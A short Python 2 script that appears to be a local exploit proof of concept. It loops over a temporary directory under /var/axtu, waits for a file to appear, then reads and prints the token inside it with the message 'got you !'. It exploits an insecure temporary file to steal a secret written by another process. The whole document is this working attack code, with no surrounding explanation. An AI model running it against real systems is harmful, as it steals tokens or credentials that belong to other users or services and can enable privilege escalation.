# do a chdir("/var/axtu ...") first
#!/usr/bin/python
import os
while 1:
    os.system("ls tmp >tt.txt")
    tk_filename = open("tt.txt").readline()
    if tk_filename:
        print "got you !"
        tk_filename = tk_filename.rstrip() #remove trailing "\n"
        tk = open("tmp/"+tk_filename).readline()
        print tk
        break
